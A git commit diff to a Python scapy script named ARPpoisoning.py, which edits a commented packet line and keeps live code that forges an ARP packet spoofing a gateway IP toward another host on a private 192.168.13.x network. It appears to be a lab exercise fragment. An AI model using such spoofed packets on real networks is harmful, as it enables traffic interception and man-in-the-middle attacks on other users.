0601f1f0d38baa540d12236f57014eda2f32a586
kondy <51909685+2739673455@users.noreply.github.com>
2023-09-30 21:50:13 +0800

    Update ARPpoisoning.py

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -2,8 +2,7 @@ from scapy.all import *
 import time
 
 # pkt = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff") / \
-#     ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02") / \
-#     IP(dst="192.168.13.129")
+#     ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02")
 pkt = ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02") / \
     IP(src="192.168.13.2", dst="192.168.13.129")
 
